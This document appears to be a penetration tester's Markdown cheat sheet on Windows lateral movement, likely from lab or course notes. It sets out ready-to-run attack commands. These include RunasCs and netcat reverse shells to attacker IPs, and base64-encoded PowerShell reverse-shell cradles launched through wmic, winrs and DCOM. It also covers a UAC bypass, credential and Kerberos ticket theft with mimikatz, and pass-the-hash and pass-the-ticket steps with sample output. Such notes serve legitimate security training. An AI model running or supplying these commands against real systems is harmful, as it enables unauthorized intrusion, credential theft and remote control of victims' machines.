# Lateral Movement

## Techniques

### [RunasCs](../11%20Windows/0%20Lateral%20Movement/RunasCs.md)

```powershell
# Run a command as a local user
.\RunasCs.exe user1 password1 "cmd /c whoami /all"

# Run a command as a domain user and logon type as NetworkCleartext (8)
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8

# Run a background process as a local user,
.\RunasCs.exe user1 password1 "C:\Temp\nc.exe 10.10.14.82 9001 -e cmd.exe" -t 0

# Redirect stdin, stdout and stderr of the specified command to a remote host
.\RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444

# Run a command simulating the /netonly flag of runas.exe
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9

# Run a command as an Administrator bypassing UAC
.\RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac

# Run a command as an Administrator through remote impersonation
.\RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

### wmic (WMI - 445)

`wmic` is an alternative to RunasCs if we dont have file download permission or need to be stealthy

```powershell
# Start a process
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

# Pop a shell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
# Create a cradle with ps_cradle_gen.sh to upload
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

### winrs (WinRM - 5985)

Allows us to execute commands remotely

```bash
# Execute commands
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

# Pop a shell (cradle with ps_cradle_gen.sh)
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

### Powershell Remoting

```powershell
# Create a session
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
```

### PsExec

Requires:

- User logging in to be a member of the `administrators` local group
- `ADMIN$` share must be available (default)
- File and printer sharing must be turned on (default)

```bash
./PsExec64.exe -i \\files04 -u corp\jen -p Nexus123! cmd
```

### Pass the Hash

[wmiexec](0%20Tools/Connect/wmiexec.md)

This techniques works against Active Directory domain accounts and the built-in local administrator account.

### Overpass the Hash

Provides us with access to a resource with Kerberos authentication using a NTLM hash.

The pretext for this attack involves a user right clicking a file, clicking `Run as different user`, and entering credentials for said user. These credentials are then cached on the machine, and recoverable via `mimikatz`.

```
privilege::debug
sekurlsa::logonpasswords
```

In this example, we reveal the hash `369def79d8372408bf6e93364cc93075` for the user `jen`

The essence of this attack involves turning the NTLM hash into a Kerberos ticket to avoid the use of NTLM authentication. We can once again use `mimikatz` for this.

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

This will now launch a new PowerShell session that allows us to execute commands as `jen`

If we run `whoami` at this point we can see it shows our previous user's identity, but this is intended.

We can now generate a TGT as `jen` and view the granted ticket with the following commands

```
PS C:\Windows\system32> net use \\files04
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

We can now see our `net user` command was successful. We have now sucessfully converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.

Although PsExec cannot accept password hashes for remote connections, we can use our generated Kerberos tickets to obtain code executeion on the remote machine we just generated our ticket for as `jen`.

```
.\PsExec.exe \\files04 cmd
```

### Pass the Ticket

Involves stealing another users Kerberos ticket on the local machine with `mimikatz` to gain access to a resource

```
privilege::debug
sekurlsa::tickets /export
```

We can now verify newly generated tickets with the following command

```
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```

For this example, we can pick any TGS ticket in the `dave@cifs-web04.kirbi` format and inject it with `mimikatz`

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

We can now check if the ticket was loaded properly

```
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

We see that the `dave` ticket has been successfully imported in our own session for the `jen` user. We can now confirm that we have been granted access to an origianlly restricted shared folder

```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```

### DCOM (135)

Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

This method allows execution of any shell command as long as the authenticated user is authorized, which is default for local administrators.

We first instantiate a remote MMC 2.0 application

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

The application object is now saved into the `$dcom` variable, for which we can pass arguments to

```
# Execute calc
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

# Pop a shell (courtesy of ps_cradle_gen.sh)
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
